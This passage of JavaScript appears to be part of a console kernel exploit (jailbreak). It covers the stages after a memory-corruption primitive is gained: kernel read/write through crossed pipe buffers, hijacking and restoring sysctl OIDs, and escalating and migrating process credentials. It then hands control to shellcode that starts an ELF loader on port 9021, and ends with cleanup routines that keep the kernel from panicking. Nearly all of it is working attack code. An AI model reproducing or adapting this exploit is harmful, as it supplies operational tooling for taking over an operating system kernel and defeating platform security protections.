                    (okAddr && okSize ? "ok" : "FAILED") + ", size reads back 0x" +
                    back.toString() + ")");
                } else {
                  await asay("handoff 0a: eboot segments not found (eboot " +
                    (eboot ? "0x" + eboot.toString() : "invalid") +
                    ") - the shellcode may not resolve its imports");
                }
                if (typeof FHOLD_PIPES === "undefined" || FHOLD_PIPES)
                  await this.holdPipeFiles("handoff 0b");
              }
            }
            if (typeof PROBE_DLSYM !== "undefined" && PROBE_DLSYM &&
                typeof dlsym === "function") {
              for (const sym of ["memcpy", "sysctlbyname", "pthread_create"]) {
                try {
                  const addr = dlsym(LIBKERNEL_HANDLE, sym);
                  await asay("handoff 0c: dlsym(libkernel, " + sym + ") = 0x" +
                    BigInt(addr).toString(16));
                } catch (e) {
                  await asay("handoff 0c: dlsym(libkernel, " + sym + ") FAILED: " +
                    e.message + " - the shellcode's import resolver will fail too");
                }
              }
            }
            const allproc = big(this.kaddr(this.off.allproc));
            const master_pipe = [BigInt(this.master.readFd), BigInt(this.master.writeFd)];
            const victim_pipe = [BigInt(this.victim.readFd), BigInt(this.victim.writeFd)];
            for (const fd of master_pipe.concat(victim_pipe))
              await this.sysInt(SYS_FCNTL, fd, F_SETFL, O_NONBLOCK);
            this.report("kexp", "handoff (allproc 0x" + allproc.toString(16) +
              ", master " + master_pipe.join("/") + ", victim " +
              victim_pipe.join("/") + ")");
            if (typeof DIAGNOSE_AFTER_HANDOFF !== "undefined" && DIAGNOSE_AFTER_HANDOFF) {
              await asay("diag: snapshotting the kernel state the blob is about to inherit");
              await this.snapshotKernelState("diag-before");
            }
            if (typeof SKIP_HANDOFF !== "undefined" && SKIP_HANDOFF) {
              this.report("kexp", "SKIP_HANDOFF: not starting the blob. This is a " +
                "Relapse-only jailbreak (escalate + rescue), for bisecting the " +
                "close-the-host-app panic");
              return true;
            }
            await handoff_kexp(allproc, master_pipe, victim_pipe);
            this.handedOff = true;
            this.report("kexp", "elfldr should now be listening on :9021");
            if (typeof DIAGNOSE_AFTER_HANDOFF !== "undefined" && DIAGNOSE_AFTER_HANDOFF) {
              await asay("diag: snapshotting again - the diff is what the blob changed");
              await this.snapshotKernelState("diag-after");
            }
            if (typeof STABILIZE_CREDS !== "undefined" && STABILIZE_CREDS) {
              await asay("stabilize: p2jb-style cred migration");
              await this.stabilizeCreds("stabilize");
            }
            if (typeof RESTORE_EBOOT_AFTER_HANDOFF !== "undefined" &&
                RESTORE_EBOOT_AFTER_HANDOFF && this.ebootOrig) {
              await asay("handoff 7: restoring the eboot segment descriptors");
              const seg = this.ebootSegments;
              const wa = await this.writeKernel64(seg.add32(0x08),
                this.ebootOrig.addr.low, this.ebootOrig.addr.hi);
              const wz = await this.writeKernel64(seg.add32(0x10),
                this.ebootOrig.size.low, this.ebootOrig.size.hi);
              const back = await this.readKernel64(seg.add32(0x10));
              const backAddr = await this.readKernel64(seg.add32(0x08));
              const same = back.low === this.ebootOrig.size.low &&
                back.hi === this.ebootOrig.size.hi &&
                backAddr.low === this.ebootOrig.addr.low &&
                backAddr.hi === this.ebootOrig.addr.hi;
              this.ebootRestored = same;
              this.report("kexp", "eboot segments restored: addr reads back 0x" +
                backAddr.toString() + " (want 0x" + this.ebootOrig.addr.toString() +
                "), size 0x" + back.toString() + " (want 0x" +
                this.ebootOrig.size.toString() + ") (" +
                (wa && wz && same ? "verified" : "MISMATCH") + ")");
            }
            return true;
          }
          async restoreOids() {
            if (!this.crossed) return;
            const { a, b, c, originalKind } = this.off.oid;
            for (const oid of [a, b, c])
              await this.writeKernel64(this.kaddr(oid.arg1), this.kaddr(oid.arg1Value));
            for (const oid of [a, b, c])
              await this.writeKernel32(this.kaddr(oid.kind), originalKind);
            await this.writeKernel32(this.kaddr(b.visible), 0);
            await this.writeKernel32(this.kaddr(a.deadSink), 0);
            await this.writeKernel32(this.kaddr(this.off.walkCounter.addr), 0);
            this.mibC = null;
            this.oidsRestored = true;
            const cpus = await this.sysctlReadInt(this.mibA);
            const stillVisible = (await this.oidKind(this.mibB)) !== null;
            const ok = cpus.rv === 0 && !stillVisible;
            if (!ok) this.report("Cleanup", "oid restore check failed");
          }
          async snapshotKernelState(label) {
            const K = (v) => v !== null && ((v.hi >>> 16) === 0xffff);
            const H = (v) => (v === null ? "-" :
              (K(v) ? "0x" + v.toString() : "0x" + v.toString() + "!USER"));
            const same = (a, b) => K(a) && K(b) && a.low === b.low && a.hi === b.hi;
            const hex = (v) => "0x" + (v >>> 0).toString(16);
            const out = [];
            try {
              if (!this.curproc) await this.findCurrentProcess();
              const p = this.curproc;
              if (!p) { this.report(label, "curproc unavailable - snapshot skipped"); return; }
              const off = this.off;
              const ucred = await this.readKernel64(p.add32(off.proc.ucred));
              const pfd = await this.readKernel64(p.add32(off.proc.fd));
              const pid = await this.readKernel32(p.add32(off.proc.pid));
              out.push("proc " + H(p) + " pid " + pid + " p_ucred " + H(ucred));
              if (K(ucred)) {
                out.push("ucred cr_ref " + (await this.readKernel32(ucred)) +
                  " uid " + (await this.readKernel32(ucred.add32(off.ucred.uid))) +
                  " ruid " + (await this.readKernel32(ucred.add32(off.ucred.ruid))) +
                  " ngroups " + (await this.readKernel32(ucred.add32(off.ucred.ngroups))) +
                  " authid " + H(await this.readKernel64(ucred.add32(off.ucred.sceAuthId))) +
                  " caps0 " + H(await this.readKernel64(ucred.add32(off.ucred.sceCaps))) +
                  " attrs " + hex(await this.readKernel32(ucred.add32(off.ucred.sceAttrs))));
              }
              if (K(pfd)) {
                const table = await this.readKernel64(pfd.add32(off.filedesc.files));
                out.push("fdesc table " + H(table) +
                  " cdir " + H(await this.readKernel64(pfd.add32(off.filedesc.cdir))) +
                  " rdir " + H(await this.readKernel64(pfd.add32(off.filedesc.rdir))) +
                  " jdir " + H(await this.readKernel64(pfd.add32(off.filedesc.jdir))));
                if (K(table)) {
                  const nfiles = await this.readKernel32(table.add32(off.filedescTable.nfiles));
                  const ofiles = table.add32(off.filedescTable.ofiles);
                  const stride = off.filedescTable.entryStride;
                  const cap = Math.min(nfiles, 512);
                  let live = 0, mismatch = 0, user = 0;
                  const odd = [];
                  for (let i = 0; i < cap; i++) {
                    const fp = await this.readKernel64(ofiles.add32(i * stride));
                    if (!K(fp)) continue;
                    live++;
                    const fcred = await this.readKernel64(fp.add32(0x10));
                    if (!K(fcred)) {
                      user++;
                      if (odd.length < 5) odd.push("fd" + i + " f_cred " + H(fcred));
                    } else if (!same(fcred, ucred)) {
                      mismatch++;
                      if (odd.length < 5) odd.push("fd" + i + " f_cred " + H(fcred) +
                        " f_count " + (await this.readKernel32(fp.add32(0x28))));
                    }
                  }
                  out.push("files nfiles " + nfiles + " scanned " + cap + " live " + live +
                    " f_cred!=p_ucred " + mismatch + " non-kernel " + user);
                  for (const o of odd) out.push("  " + o);
                }
              }
              const td0 = await this.readKernel64(p.add32(0x10));
              let td = td0, n = 0, tdMismatch = 0, tdUser = 0;
              const lines = [];
              while (K(td) && n < 500) {
                n++;
                const tdproc = await this.readKernel64(td.add32(0x08));
                if (!same(tdproc, p)) { lines.push("td " + H(td) + " td_proc MISMATCH"); break; }
                const tu = await this.readKernel64(td.add32(0x140));
                if (!K(tu)) { tdUser++; lines.push("td " + H(td) + " td_ucred " + H(tu)); }
                else if (!same(tu, ucred)) {
                  tdMismatch++;
                  if (lines.length < 6) lines.push("td " + H(td) + " td_ucred " + H(tu));
                }
                td = await this.readKernel64(td.add32(0x10));
              }
              out.push("threads " + n + " td_ucred!=p_ucred " + tdMismatch +
                " non-kernel " + tdUser);
              for (const l of lines) out.push("  " + l);
              const pd = await this.readKernel64(p.add32(off.proc.dynlib));
              if (K(pd))
                out.push("dynlib " + H(pd) +
                  " syscallStart " + H(await this.readKernel64(pd.add32(off.dynlib.syscallStart))) +
                  " end " + H(await this.readKernel64(pd.add32(off.dynlib.syscallEnd))) +
                  " restrictFlags " + H(await this.readKernel64(pd.add32(off.dynlib.restrictFlags))));
              if (this.master && this.victim && this.master.pipe && this.victim.pipe)
                out.push("pipes master " + H(this.master.pipe) + ".buffer " +
                  H(await this.readKernel64(this.master.pipe.add32(off.pipe.buffer))) +
                  " | victim " + H(this.victim.pipe) + ".buffer " +
                  H(await this.readKernel64(this.victim.pipe.add32(off.pipe.buffer))));
            } catch (e) {
              out.push("snapshot failed: " + e.message);
            }
            for (const line of out) this.report(label, line);
          }
          async stabilizeCreds(label) {
            const K = (v) => v !== null && ((v.hi >>> 16) === 0xffff);
            const H = (v) => (v === null ? "-" : "0x" + v.toString());
            const same = (a, b) => K(a) && K(b) && a.low === b.low && a.hi === b.hi;
            try {
              if (!this.curproc) await this.findCurrentProcess();
              const p = this.curproc;
              const b = p ? await this.readKernel64(p.add32(this.off.proc.ucred)) : null;
              if (!K(b)) {
                this.report(label, "p_ucred " + H(b) + " is not a kernel pointer - skipped");
                return;
              }
              let fdMigrated = 0;
              const pfd = await this.readKernel64(p.add32(this.off.proc.fd));
              const table = K(pfd) ?
                await this.readKernel64(pfd.add32(this.off.filedesc.files)) : null;
              if (K(table)) {
                const nfiles = await this.readKernel32(table.add32(this.off.filedescTable.nfiles));
                const ofiles = table.add32(this.off.filedescTable.ofiles);
                const stride = this.off.filedescTable.entryStride;
                for (let i = 0; i < Math.min(nfiles, 512); i++) {
                  const fp = await this.readKernel64(ofiles.add32(i * stride));
                  if (!K(fp)) continue;
                  const fcred = await this.readKernel64(fp.add32(0x10));
                  if (!K(fcred) || same(fcred, b)) continue;
                  if (await this.writeKernel64(fp.add32(0x10), b.low, b.hi)) fdMigrated++;
                }
              }
              let tdMigrated = 0;
              let td = await this.readKernel64(p.add32(0x10));
              for (let n = 0; K(td) && n < 500; n++) {
                const tdproc = await this.readKernel64(td.add32(0x08));
                if (!same(tdproc, p)) break;
                const tu = await this.readKernel64(td.add32(0x140));
                if (K(tu) && !same(tu, b) &&
                    await this.writeKernel64(td.add32(0x140), b.low, b.hi)) tdMigrated++;
                td = await this.readKernel64(td.add32(0x10));
              }
              const total = fdMigrated + tdMigrated;
              if (total > 0) {
                const before = await this.readKernel32(b);
                await this.writeKernel32(b, before + total);
                this.report(label, total + " cred refs migrated (" + fdMigrated +
                  " f_cred, " + tdMigrated + " td_ucred), cr_ref " + before + " -> " +
                  (await this.readKernel32(b)));
              } else {
                this.report(label, "nothing to migrate - every f_cred and td_ucred " +
                  "already points at p_ucred " + H(b) + " (cr_ref " +
                  (await this.readKernel32(b)) + ")");
              }
            } catch (e) {
              this.report(label, "failed: " + e.message);
            }
          }
          async disarmPipes() {
            if (!this.crossed || this.disarmed) return this.disarmed;
            const { buffer, count, in: inOff, out: outOff, size } = this.off.pipe;
            const master = this.master.pipe;
            const victim = this.victim.pipe;
            const victimOk = await this.writeKernel64(victim.add32(buffer), 0, 0);
            const masterOk = (await this.kwrite64(master.add32(buffer), new int64(0, 0))) === 0;
            let fields = 0;
            for (const p of [master, victim])
              for (const off of [count, inOff, outOff, size])
                if ((await this.kwrite32(p.add32(off), 0)) === 0) fields++;
            const mb = await this.kread64(master.add32(buffer));
            const vb = await this.kread64(victim.add32(buffer));
            const clean = mb.value.low === 0 && mb.value.hi === 0 &&
              vb.value.low === 0 && vb.value.hi === 0;
            this.disarmed = clean;
            this.report("pipes", clean
              ? "both pipe buffers disarmed (" + fields + "/8 head fields zeroed)"
              : "DISARM INCOMPLETE (master.buffer 0x" + mb.value.toString() +
                ", victim.buffer 0x" + vb.value.toString() + ", victimOk=" + victimOk +
                ", masterOk=" + masterOk + ") - closing the host app may still panic");
            return clean;
          }
          async savePipeBuffers() {
            const { buffer, size } = this.off.pipe;
            const bm = await this.kread64(this.master.pipe.add32(buffer));
            const bs = await this.kread32(this.master.pipe.add32(size));
            const bv = await this.kread64(this.victim.pipe.add32(buffer));
            const vs = await this.kread32(this.victim.pipe.add32(size));
            if (bm.rv !== 0 || bv.rv !== 0) {
              this.report("pipes", "could not read the real buffers before crossing - " +
                "restoreRealBuffers() will have nothing to restore");
              return false;
            }
            this.savedBuffers = { master: bm.value, masterSize: bs.value,
              victim: bv.value, victimSize: vs.value };
            this.report("pipes", "saved real buffers before crossing: master 0x" +
              bm.value.toString() + " size " + bs.value + ", victim 0x" +
              bv.value.toString() + " size " + vs.value);
            return true;
          }
          async restoreRealBuffers() {
            const s = this.savedBuffers;
            if (!s) {
              this.report("pipes", "no saved buffers - cannot restore");
              return false;
            }
            const { buffer, count, in: inOff, out: outOff, size } = this.off.pipe;
            let ok = 0;
            const tried = 10;
            for (const [p, b, sz] of [[this.master.pipe, s.master, s.masterSize],
              [this.victim.pipe, s.victim, s.victimSize]]) {
              if ((await this.kwrite64(p.add32(buffer), b)) === 0) ok++;
              if ((await this.kwrite32(p.add32(size), sz)) === 0) ok++;
              for (const off of [count, inOff, outOff])
                if ((await this.kwrite32(p.add32(off), 0)) === 0) ok++;
            }
            const mb = await this.kread64(this.master.pipe.add32(buffer));
            const vb = await this.kread64(this.victim.pipe.add32(buffer));
            const good = mb.value.low === s.master.low && mb.value.hi === s.master.hi &&
              vb.value.low === s.victim.low && vb.value.hi === s.victim.hi;
            this.disarmed = good;
            this.report("pipes", good
              ? "both real buffers restored and verified (" + ok + "/" + tried +
                " writes ok) - the pair now looks like an ordinary used pipe"
              : "BUFFER RESTORE FAILED (" + ok + "/" + tried + " writes, master 0x" +
                mb.value.toString() + " want 0x" + s.master.toString() + ", victim 0x" +
                vb.value.toString() + " want 0x" + s.victim.toString() +
                ") - closing the host app may still panic");
            return good;
          }
          async restoreOidsSlow() {
            const { a, b, c, originalKind } = this.off.oid;
            const step = async (what, fn) => {
              const rv = await fn();
              this.report("Cleanup", "slow-oid " + what + (rv === undefined ? " done" : " rv " + rv));
              return rv;
            };
            for (const [n, oid] of [["a", a], ["b", b], ["c", c]])
              await step("arg1(" + n + ")", async () => {
                await this.kwrite64(this.kaddr(oid.arg1), this.kaddr(oid.arg1Value));
              });
            for (const [n, oid] of [["a", a], ["b", b], ["c", c]])
              await step("kind(" + n + ")", async () =>
                this.kwrite32(this.kaddr(oid.kind), originalKind));
            await step("b.visible", async () => this.kwrite32(this.kaddr(b.visible), 0));
            await step("a.deadSink", async () => this.kwrite32(this.kaddr(a.deadSink), 0));
            await step("walkCounter", async () =>
              this.kwrite32(this.kaddr(this.off.walkCounter.addr), 0));
            this.mibC = null;
            this.oidsRestored = true;
            const cpus = await this.sysctlReadInt(this.mibA);
            const stillVisible = (await this.oidKind(this.mibB)) !== null;
            const ok = cpus.rv === 0 && !stillVisible;
            this.report("Cleanup", ok
              ? "oids restored through the slow window (pipes already disarmed)"
              : "SLOW OID RESTORE CHECK FAILED (kern.smp.cpus rv " + cpus.rv +
                ", oid b still visible: " + stillVisible + ")");
            return ok;
          }
          async dumpPipeStructs(label, useSlow) {
            const H = (v) => (v === null ? "-" : "0x" + v.toString());
            const rd = useSlow
              ? async (addr) => { const r = await this.kread64(addr); return r.rv === 0 ? r.value : null; }
              : async (addr) => this.readKernel64(addr);
            try {
              if (!this.master || !this.victim) { this.report(label, "no pipes"); return; }
              if (!this.curproc) await this.findCurrentProcess();
              const fdField = this.curproc.add32(this.off.proc.fd);
              const fdp = useSlow ? (await this.kread64(fdField)).value : await this.fptr(fdField);
              if (!fdp || !this.isKernelPointer(fdp)) { this.report(label, "no fd table"); return; }
              const pair = this.alloc(16);
              this.clear(pair, 16);
              if ((await this.sysInt(SYS_PIPE2, pair, 0)) !== 0) {
                this.report(label, "could not create the reference pipe");
                return;
              }
              const refFd = this.readU32(pair, 0) | 0;
              this.fds.push(refFd, this.readU32(pair, 4) | 0);
              const ref = await this.findPipe(fdp, refFd, "reference");
              if (!ref || !ref.pipe) { this.report(label, "reference pipe unresolved"); return; }
              const { buffer, count, in: inOff, out: outOff, size } = this.off.pipe;
              const known = {};
              known[buffer] = "buffer"; known[count] = "count"; known[inOff] = "in";
              known[outOff] = "out"; known[size] = "size";
              const dumps = {};
              for (const [name, addr] of [["master", this.master.pipe],
                                          ["victim", this.victim.pipe],
                                          ["reference", ref.pipe]]) {
                const words = [];
                for (let off = 0; off < 0x100; off += 8) {
                  const w = await rd(addr.add32(off));
                  words.push(w === null ? "?" : w.toString());
                }
                dumps[name] = words;
                this.report(label, name + " @ " + H(addr));
              }
              for (const name of ["master", "victim"]) {
                const diffs = [];
                for (let i = 0; i < 0x100 / 8; i++) {
                  const off = i * 8;
                  if (dumps[name][i] !== dumps.reference[i])
                    diffs.push("+0x" + off.toString(16) + (known[off] ? " (" + known[off] + ")" : "") +
                      ": " + name + "=" + dumps[name][i] + " fresh=" + dumps.reference[i]);
                }
                this.report(label, name + " differs from a fresh pipe at " + diffs.length + " qword(s)");
                for (const d of diffs.slice(0, 16)) this.report(label, "  " + d);
              }
            } catch (e) {
              this.report(label, "failed: " + e.message);
            }
          }
          async makeReferencePipe(label) {
            try {
              const pair = this.alloc(16);
              this.clear(pair, 16);
              if ((await this.sysInt(SYS_PIPE2, pair, 0)) !== 0) {
                this.report(label, "pipe2 failed");
                return null;
              }
              const readFd = this.readU32(pair, 0) | 0;
              const writeFd = this.readU32(pair, 4) | 0;
              this.fds.push(readFd, writeFd);
              const fdp = await this.fptr(this.curproc.add32(this.off.proc.fd));
              if (!fdp) { this.report(label, "no fd table"); return null; }
              const info = await this.findPipe(fdp, readFd, "reference");
              if (!info || !info.pipe) { this.report(label, "reference pipe unresolved"); return null; }
              this.refPipe = info.pipe;
              this.report(label, "reference pipe @ 0x" + info.pipe.toString() +
                " (fds " + readFd + "/" + writeFd + ", never written)");
              return info.pipe;
            } catch (e) {
              this.report(label, "failed: " + e.message);
              return null;
            }
          }
          async cleanTeardown() {
            if (typeof PIPE_STRUCT_DIFF !== "undefined" && PIPE_STRUCT_DIFF && this.crossed)
              await this.dumpPipeStructs("pipe-diff-crossed", false);
            if (typeof AIO_POISON_SNAPSHOT !== "undefined" &&
                AIO_POISON_SNAPSHOT && this.crossed)
              await this.verifyAioPoison("poison-verify");
            if (typeof AIO_POISON_SCRUB !== "undefined" && AIO_POISON_SCRUB && this.crossed)
              await this.scrubAioPoison("poison-scrub");
            let disarmed;
            if (!this.crossed) {
              disarmed = true;
            } else if (typeof RESTORE_REAL_BUFFERS !== "undefined" && RESTORE_REAL_BUFFERS) {
              disarmed = await this.restoreRealBuffers();
              if (!disarmed) {
                this.report("Cleanup", "restore failed - falling back to zeroing the buffers, " +
                  "which is the state Build U panicked from");
                disarmed = await this.disarmPipes();
              }
            } else {
              disarmed = await this.disarmPipes();
            }
            this.crossed = false;
            this.report("Cleanup", "pipes made safe: " + disarmed +
              (disarmed ? "" : " - a pipe may still be armed, closing the host app can panic"));
            if (typeof PIPE_STRUCT_DIFF !== "undefined" && PIPE_STRUCT_DIFF)
              await this.dumpPipeStructs("pipe-diff-disarmed", true);
            if (typeof SKIP_OID_RESTORE !== "undefined" && SKIP_OID_RESTORE) {
              this.report("Cleanup", "SKIP_OID_RESTORE: pipes disarmed, OIDs left hijacked " +
                "(the slow window cannot restore its own writable kind)");
              this.oidsRestored = false;
            } else {
              this.report("Cleanup", "slow-oid restore starting (window still hijacked)");
              await this.restoreOidsSlow();
            }
            if (typeof SKIP_RELEASE_WORKERS !== "undefined" && SKIP_RELEASE_WORKERS)
              this.report("Cleanup", "SKIP_RELEASE_WORKERS: leaving the aio workers parked");
            else await this.releaseAioWorkers();
            await sleep(200);
            await this.closeScratchDescriptors();
            this.report("Cleanup", "clean teardown done: pipes " +
              (disarmed ? "safe (real buffers restored)" : "MAY STILL BE ARMED - closing can panic") +
              ", groups defused, oids " +
              (this.oidsRestored ? "restored" : "LEFT HIJACKED until reboot") +
              ", workers released, scratch fds closed");
          }
          async fptr(address) {
            const v = await this.readKernel64(address);
            return this.isKernelPointer(v) ? v : null;
          }
          async aioSlot(table, id) {
            const { pages, slotStride } = this.off.aio.idTable;
            const index = id & 0x1fff;
            const pageCount = await this.readKernel32(table.add32(pages));
            if (pageCount === 0 || pageCount > 64 || index >= (pageCount << 7)) return null;
            const page = await this.fptr(table.add32((index >>> 7) * 8));
            if (!page) return null;
            const slot = page.add32((id & 0x7f) * slotStride);
            const w24 = await this.readKernel32(slot.add32(0x24));
            return {
              slot: slot,
              type: await this.readKernel32(slot.add32(0x20)),
              state: w24 >>> 16,
              freeNext: w24 & 0xffff,
              gen: await this.readKernel32(slot.add32(0x28)),
              obj: await this.fptr(slot.add32(0x10)),
            };
          }
          async dumpAioState(label) {
            const K = (v) => v !== null && ((v.hi >>> 16) === 0xffff);
            const H = (v) => (v === null ? "-" : "0x" + v.toString());
            try {
              if (!this.curproc) await this.findCurrentProcess();
              const table = await this.fptr(
                this.curproc.add32(this.off.proc.aioInfo));
              if (!table) { this.report(label, "p_aioinfo is NULL"); return; }
              const head = [];
              for (let off = 0; off < 0x40; off += 8)
                head.push("+" + off.toString(16) + "=" +
                  H(await this.readKernel64(table.add32(off))));
              this.report(label, "aioinfo " + H(table) + " " + head.join(" "));
              this.report(label, "idTable pages " +
                (await this.readKernel32(table.add32(this.off.aio.idTable.pages))));
              const { num, state, waiters } = this.off.aio.group;
              const ids = [];
              for (const group of this.armedGroups) for (const id of group) ids.push(id);
              const parked = this.parkedIds || [];
              this.report(label, "tracking " + ids.length + " armed-group ids and " +
                parked.length + " parked-job ids");
              const tally = {};
              let armedLeft = 0;
              const samples = [];
              for (const id of ids) {
                const s = await this.aioSlot(table, id);
                if (!s) { tally.missing = (tally.missing || 0) + 1; continue; }
                const key = "armed type=" + (s.type & 0xffff) + " state=" + s.state;
                tally[key] = (tally[key] || 0) + 1;
                if (s.obj) {
                  const shared = await this.fptr(s.obj.add32(0x10));
                  const gState = shared ? await this.readKernel32(shared.add32(state)) : -1;
                  const gNum = shared ? await this.readKernel32(shared.add32(num)) : -1;
                  const gWait = shared ? await this.readKernel64(shared.add32(waiters)) : null;
                  if (gWait && (gWait.low !== 0 || gWait.hi !== 0)) armedLeft++;
                  if (samples.length < 6)
                    samples.push("  id " + id + " obj " + H(s.obj) + " shared " + H(shared) +
                      " num " + gNum + " state " + gState + " waiters " + H(gWait) +
                      (!gWait ? " (unreachable)" :
                        (gWait.low === 0 && gWait.hi === 0 ? " (clear)" : "  <-- STILL ARMED")));
                } else if (samples.length < 6) {
                  samples.push("  id " + id + " obj - (slot type " + s.type +
                    " state " + s.state + " gen " + s.gen + ")");
                }
              }
              for (const k of Object.keys(tally)) this.report(label, "armed slots: " + k + " x" + tally[k]);
              for (const s of samples) this.report(label, s);
              this.report(label, armedLeft + " armed groups still have a waiters list");
              const ptally = {};
              const psamples = [];
              for (const id of parked) {
                const s = await this.aioSlot(table, id);
                if (!s) { ptally.missing = (ptally.missing || 0) + 1; continue; }
                const key = "type=" + (s.type & 0xffff) + " state=" + s.state;
                ptally[key] = (ptally[key] || 0) + 1;
                if (psamples.length < 6)
                  psamples.push("  parked id " + id + " type " + (s.type & 0xffff) +
                    " state " + s.state + " obj " + H(s.obj) + " gen " + s.gen);
              }
              for (const k of Object.keys(ptally)) this.report(label, "parked slots: " + k + " x" + ptally[k]);
              for (const s of psamples) this.report(label, s);
            } catch (e) {
              this.report(label, "dump failed: " + e.message);
            }
          }
          async leakAioInfo(label) {
            const K = (v) => v !== null && ((v.hi >>> 16) === 0xffff);
            const H = (v) => (v === null ? "-" : "0x" + v.toString());
            try {
              if (!this.curproc) await this.findCurrentProcess();
              const field = this.curproc.add32(this.off.proc.aioInfo);
              const before = await this.fptr(field);
              if (!before) { this.report(label, "p_aioinfo already NULL"); return; }
              const ok = await this.writeKernel64(field, 0, 0);
              const after = await this.fptr(field);
              this.report(label, "p_aioinfo " + H(before) + " -> " + H(after) +
                " (wrote " + (ok ? "ok" : "FAILED") + ") - the aio structures are " +
                "leaked on purpose so process exit does not walk them");
            } catch (e) {
              this.report(label, "failed: " + e.message);
            }
          }
          async restorePipes() {
            if (typeof LEAVE_PIPES_ARMED !== "undefined" && LEAVE_PIPES_ARMED) {
              this.report("pipes", "the pair is left crossed on purpose so elfldr keeps kernel " +
                "r/w. Send the pipeclean seal ELF to :9021 BEFORE closing the app - closing " +
                "with the pipes still armed panics the console.");
              return;
            }
            if (this.disarmed) return;
            if (!this.crossed) return;
            this.crossed = false;
            const { buffer } = this.off.pipe;
            if ((await this.aimVictim(this.master.pipe, 0, this.pipeSize)) !== 0) {
              this.report("Cleanup", "could not aim the victim at the master, leaving both armed");
              return;
            }
            const zeroed = this.alloc(0x20);
            const written = await this.sysInt(SYS_WRITE, this.victim.writeFd, zeroed, 0x18);
            const readBack = await this.sysInt(SYS_READ, this.victim.readFd, this.drainBuffer, 0x18);
            const nulled = written === 0x18 && readBack === 0x18 &&
              this.readU32(this.drainBuffer, buffer) === 0 && this.readU32(this.drainBuffer, buffer + 4) === 0;
            if (!nulled) this.report("Cleanup", "pipe buffer was not cleared");
          }
          async releaseAioWorkers() {
            if (!this.workerPark) return;
            try {
              await this.sysInt(SYS_CLOSE, this.workerPark.writeFd);
              await sleep(120);
              await this.sysInt(SYS_CLOSE, this.workerPark.readFd);
            } catch {
              this.report("Cleanup", "could not release aio workers");
            }
          }
          async closeScratchDescriptors() {
            const keep = [this.master, this.victim].filter(Boolean);
            for (const fd of new Set(this.fds)) {
              if (keep.some((pipe) => pipe.readFd === fd || pipe.writeFd === fd)) continue;
              await this.sysInt(SYS_CLOSE, fd);
            }
          }
          async run() {
            this.report("Kernel", "Starting kernel exploit");
            try {
              await this.leakKernelBase();
              this.report("Kernel", "base 0x" + this.kbase.toString());
              await this.pinToSingleCore();
              if (!(await this.armKernelReadWrite()))
                return this.stop("armings did not complete");
              this.report("Kernel", "read and write ready");
              if (typeof STOP_AFTER !== "undefined" && STOP_AFTER === "arm")
                return this.stop("STOP_AFTER=arm - slow r/w only, no pipes, no escalate");
              if (!(await this.findCurrentProcess()))
                return this.stop("curproc not found");
              if (!(await this.locatePipes())) return this.stop("pipes not located");
              if (typeof STOP_AFTER !== "undefined" && STOP_AFTER === "locate")
                return this.stop("STOP_AFTER=locate - both pipe pairs created and located, " +
                  "never crossed, fast r/w never established");
              if (!(await this.crossPipes()))
                return this.stop("fast read and write not established");
              this.report("Kernel", "fast read and write ready");
              if (typeof STOP_AFTER !== "undefined" && STOP_AFTER === "fast")
                return this.stop("STOP_AFTER=fast - pipes crossed, aio groups still armed");
              this.report("Kernel", "checking aio groups");
              if (typeof CLEAN_TEARDOWN !== "undefined" && CLEAN_TEARDOWN)
                this.report("Kernel", "CLEAN_TEARDOWN: the group defuse is deferred to " +
                  "rescue(), so the slow window is still alive when the pipes are " +
                  "disarmed");
              else await this.defuseAioGroups();
              if (typeof STOP_AFTER !== "undefined" && STOP_AFTER === "defuse")
                return this.stop("STOP_AFTER=defuse - aio groups cleared, privileges untouched");
              this.report("Kernel", "checking privileges");
              if (!(await this.escalate()))
                return this.stop("escalation did not clear");
              this.report("Kernel", "privileges ready");
              if (typeof STOP_AFTER !== "undefined" && STOP_AFTER === "escalate")
                return this.stop("STOP_AFTER=escalate - full jailbreak, no handoff");
              const payloads = await this.launchShellcode();
              this.report("Kernel", payloads ? "payloads loaded" : "finished");
              return { kbase: this.kbase, done: true, payloads };
            } catch (e) {
              this.report("Kernel", String((e && e.message) || e));
              throw e;
            } finally {
              await this.rescue();
            }
          }
          stop(why) {
            this.report("Kernel", "stopped: " + why);
            return { kbase: this.kbase, done: true, payloads: false };
          }
          async rescue() {
            try {
              if (this.pinnedCore !== undefined && !this.threadAttributesRestored)
                await this.restoreThreadAttributes();
              if (this.armedGroups.length && !this.defused) {
                this.report("Cleanup", "repairing aio groups");
                if (!this.curproc) await this.findCurrentProcess();
                if (this.curproc) await this.defuseAioGroups();
                else this.report("Cleanup", "current process unavailable");
              }
              if (typeof CLEAN_TEARDOWN !== "undefined" && CLEAN_TEARDOWN) {
                await this.cleanTeardown();
                return;
              }
              if (typeof PIPE_NOTE_FOR_CLEANER !== "undefined" && PIPE_NOTE_FOR_CLEANER)
                await this.makeReferencePipe("pipe-ref");
              if (typeof SKIP_OID_RESTORE !== "undefined" && SKIP_OID_RESTORE)
                this.report("Cleanup", "SKIP_OID_RESTORE: the sysctl OIDs are being left " +
                  "hijacked on purpose - diagnostic build, the window stays open");
              else await this.restoreOids();
              if (typeof AIO_POISON_SNAPSHOT !== "undefined" &&
                  AIO_POISON_SNAPSHOT && this.crossed)
                await this.verifyAioPoison("poison-verify");
              if (typeof AIO_POISON_SCRUB !== "undefined" &&
                  AIO_POISON_SCRUB && this.crossed)
                await this.scrubAioPoison("poison-scrub");
              if (typeof SKIP_RELEASE_WORKERS !== "undefined" && SKIP_RELEASE_WORKERS)
                this.report("Cleanup", "SKIP_RELEASE_WORKERS: leaving the aio workers parked");
              else await this.releaseAioWorkers();
              await sleep(200);
              if (typeof AIO_DUMP_AFTER_RELEASE !== "undefined" &&
                  AIO_DUMP_AFTER_RELEASE && this.crossed)
                await this.dumpAioState("aio-dump");
              if (typeof AIO_CANCEL_ALL !== "undefined" && AIO_CANCEL_ALL) {
                await this.cancelAllAio("aio-cancel");
                if (this.crossed) await this.dumpAioState("aio-after-cancel");
              }
              if (typeof AIO_LEAK_ON_EXIT !== "undefined" && AIO_LEAK_ON_EXIT &&
                  this.crossed)
                await this.leakAioInfo("aio-leak");
              if (typeof FHOLD_AT_RESCUE !== "undefined" && FHOLD_AT_RESCUE)
                await this.holdPipeFiles("rescue fhold");
              await this.restorePipes();
              await this.closeScratchDescriptors();
            } catch {
              this.report("Cleanup", "failed");
            }
          }
        }
        function stat_words(path) {
            const p = alloc_string(path);
            const buf = hmalloc(0x200);
            if (syscall(SYSCALL.stat, p, buf) === MASK64) return null;
            const out = [];
            for (let off = 0n; off < 0x90n; off += 8n) out.push(read64(buf + off));
            return out;
        }
